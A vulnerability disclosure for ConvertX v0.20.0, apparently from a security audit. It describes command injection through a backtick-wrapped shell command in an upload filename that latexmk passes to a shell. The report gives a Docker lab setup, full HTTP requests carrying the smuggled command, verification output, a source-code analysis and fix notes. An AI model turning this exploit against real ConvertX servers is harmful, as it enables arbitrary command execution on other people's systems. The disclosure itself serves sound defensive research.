### Vulnerability details

**Official website / Product:** https://github.com/C4illin/ConvertX

**Repository:** https://github.com/C4illin/ConvertX (stars at selection: 19276)

**Vulnerability type:** RCE (unexpected command injection via upload filename → latexmk shell)

**Vulnerability versions:** v0.20.0 (Docker `ghcr.io/c4illin/convertx:latest`; audited source commit `42224e3f1f1ad0eb6e6d2bac661a5b3f2b2a2976`)

**Vulnerability URL / Parameter:** Authenticated `POST /upload` multipart `file` filename (shell metacharacters survive `sanitize-filename`); trigger `POST /convert` with `convert_to=pdf,xelatex` and matching `file_names`

**Complex:** yes

### Verification procedure

1. Lab: official image `ghcr.io/c4illin/convertx:latest` (v0.20.0, digest `sha256:71feba87276e0d01df75baa0bba8c5d7a7324e752997d42fdb318479f76a0618`), host port **20808→3000**. Audited source commit `42224e3f1f1ad0eb6e6d2bac661a5b3f2b2a2976` (tag v0.20.0). Original compose dir was `labs/convertx-r28a8/` (container `convertx-r28a8`); if missing from the tree, use this equivalent compose:
```yaml
services:
  convertx:
    image: ghcr.io/c4illin/convertx:latest
    container_name: convertx-r28a8
    ports:
      - "20808:3000"
    environment:
      - ACCOUNT_REGISTRATION=true
      - HTTP_ALLOWED=true
      - JWT_SECRET=r28a8ConvertXLabSecretKeyForJWTSigning123456
      - PUID=0
      - AUTO_DELETE_EVERY_N_HOURS=0
      - TZ=UTC
    volumes:
      - ./data:/app/data
```
   After `docker compose up -d`, confirm `0.0.0.0:20808->3000/tcp`.
2. Register/login via the Web UI as `attacker@example.com` / `Password123!`; take `auth` from `Set-Cookie`, then `GET /` for the `jobId` cookie (cookies in the PoC below are from the verified session — replace with a live login session when reproducing).
3. `POST /upload` multipart with a `.tex` body and a filename containing backticks wrapping a shell command, e.g. `` `python3 -c 'open(chr(114)+chr(99)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116),chr(119)).write(chr(80)+chr(87)+chr(78))'`.tex ``. Double-quotes are stripped by `sanitize-filename`, so the PoC builds the Python string with `chr()` only.
4. `POST /convert` with `convert_to=pdf,xelatex` and `file_names` JSON listing that same filename.
5. Observe ConvertX process cwd: `/app/rce.txt` is created with content `PWN`. Container logs show latexmk running xelatex with the backtick filename inside double quotes, then XeTeX failing with `I can't find file './data/uploads/1/<job>/.tex'` (empty substitution after command execution).

### Complete vulnerability PoC

Prerequisite HTTP request — authenticated upload with malicious filename (Docker-verified):

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:20808
User-Agent: convertx-r28a8-poc
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr28a8poc
Content-Length: 347
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJleHAiOjE3OTQxNzgzODUsImlhdCI6MTc5MzU3MzU4NX0.Q8-m96FdsoZPPSyB_HqEdIqdB0qMX6YweYs7N4sk7pE; jobId=13
Connection: close

------WebKitFormBoundaryr28a8poc
Content-Disposition: form-data; name="file"; filename="`python3 -c 'open(chr(114)+chr(99)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116),chr(119)).write(chr(80)+chr(87)+chr(78))'`.tex"
Content-Type: application/x-tex

\documentclass{article}\begin{document}pwn\end{document}

------WebKitFormBoundaryr28a8poc--
```

Prerequisite HTTP response:

```http
HTTP/1.1 200 OK
Content-Type: application/json;charset=utf-8
Date: Sun, 01 Nov 2026 22:53:04 GMT
Content-Length: 42

{"message":"Files uploaded successfully."}
```

Trigger HTTP request — convert via xelatex/latexmk (Docker-verified):

```http
POST /convert HTTP/1.1
Host: 127.0.0.1:20808
User-Agent: convertx-r28a8-poc
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 251
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJleHAiOjE3OTQxNzgzODUsImlhdCI6MTc5MzU3MzU4NX0.Q8-m96FdsoZPPSyB_HqEdIqdB0qMX6YweYs7N4sk7pE; jobId=13
Connection: close

convert_to=pdf%2Cxelatex&file_names=%5B%22%60python3+-c+%27open%28chr%28114%29%2Bchr%2899%29%2Bchr%28101%29%2Bchr%2846%29%2Bchr%28116%29%2Bchr%28120%29%2Bchr%28116%29%2Cchr%28119%29%29.write%28chr%2880%29%2Bchr%2887%29%2Bchr%2878%29%29%27%60.tex%22%5D
```

Trigger HTTP response:

```http
HTTP/1.1 302 Found
Location: /results/13
Date: Sun, 01 Nov 2026 22:53:04 GMT
Content-Length: 0

```

Verification result notes:

After the convert redirect, confirm the RCE artifact and retained upload filename inside the container:

```bash
docker exec convertx-r28a8 ls -l /app/rce.txt
docker exec convertx-r28a8 cat /app/rce.txt
docker exec convertx-r28a8 ls -la /app/data/uploads/1/13/
```

Expected output:

```
-rw-r--r-- 1 root root 3 Nov  1 22:53 /app/rce.txt
CONTENT:
PWN
UPLOAD_DIR:
total 12
drwxr-xr-x  2 root root 4096 Nov  1 22:53 .
drwxr-xr-x 12 root root 4096 Nov  1 22:53 ..
-rw-r--r--  1 root root   57 Nov  1 22:53 `python3 -c 'open(chr(114)+chr(99)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116),chr(119)).write(chr(80)+chr(87)+chr(78))'`.tex
```

Container logs show latexmk invoking xelatex with the backtick filename inside double quotes, then XeTeX failing (jobId=13 verified):

```
Running 'xelatex -no-pdf -interaction=nonstopmode -recorder -output-directory="data/output/1/13"  "./data/uploads/1/13/`python3 -c 'open(chr(114)+chr(99)+chr(101)+chr(46)+chr(116)+chr(120)+chr(116),chr(119)).write(chr(80)+chr(87)+chr(78))'`.tex"'
! I can't find file `./data/uploads/1/13/.tex'.
```

This proves shell expansion of the backticks before XeTeX open. Impact: arbitrary OS command execution as the ConvertX process user (root in this lab with `PUID=0`; non-root when PUID is set).

### Vulnerability analysis

ConvertX stores uploads under `uploadsDir/<userId>/<jobId>/` using `sanitize-filename` on the client-supplied multipart filename (`src/pages/upload.tsx`). The same sanitizer is reapplied to `file_names` in `src/pages/convert.tsx`. That library removes path separators and a short Windows/Unix illegal set (`/ ? < > \ : * | "` and C0/C1 controls) but **leaves shell metacharacters** including backticks, `$()`, `;`, `&`, and spaces.

For `.tex` → PDF, `src/converters/xelatex.ts` invokes:

`latexmk -xelatex -interaction=nonstopmode -output-directory=<outdir> <filePath>`

via Node `execFile` (argv-safe). Latexmk itself then constructs a **shell** command to run xelatex and embeds `<filePath>` inside double quotes. Inside double quotes, POSIX shells still expand command substitutions (`` `cmd` `` / `$(cmd)`). The attacker-controlled basename therefore executes before TeX opens the file; the expanded empty stdout leaves a truncated path such as `.../12/.tex`, matching the observed XeTeX error.

This is **unexpected command injection** (filename → latexmk shell), not designed document-content execution (contrast blocked Calibre `.recipe` Python gadgets / restricted `\write18`).

Trigger / sink source (full path and line numbers):

```typescript
# File: src/pages/upload.tsx
# Lines: 26-34
    if (body?.file) {
      if (Array.isArray(body.file)) {
        for (const file of body.file) {
          const santizedFileName = sanitize(file.name);
          await Bun.write(`${userUploadsDir}${santizedFileName}`, file);
        }
      } else {
        const santizedFileName = sanitize(body.file["name"]);
        await Bun.write(`${userUploadsDir}${santizedFileName}`, body.file);
      }
    }
```

```typescript
# File: src/pages/convert.tsx
# Lines: 76-86
    for (let i = 0; i < fileNames.length; i++) {
      fileNames[i] = sanitize(fileNames[i] || "");
    }
    // ...
    handleConvert(fileNames, userUploadsDir, userOutputDir, convertTo, converterName, jobId)
```

```typescript
# File: src/converters/xelatex.ts
# Lines: 22-29
  return new Promise((resolve, reject) => {
    const outputPath = targetPath.split("/").slice(0, -1).join("/").replace("./", "");

    execFile(
      "latexmk",
      ["-xelatex", "-interaction=nonstopmode", `-output-directory=${outputPath}`, filePath],
```

### Fix notes

1. Reject or neutralize shell metacharacters in filenames (allowlist `[A-Za-z0-9._-]+` after `sanitize-filename`).
2. Prefer invoking `xelatex`/`latexmk` without a shell, or pass a regenerated safe basename (UUID) while preserving only a safe display name in the DB.
3. Run ConvertX as an unprivileged user with a tight working directory; treat TeX tools as untrusted with hostile filenames.
4. Optionally disable xelatex/latexmk in internet-exposed deployments until filename handling is hardened.

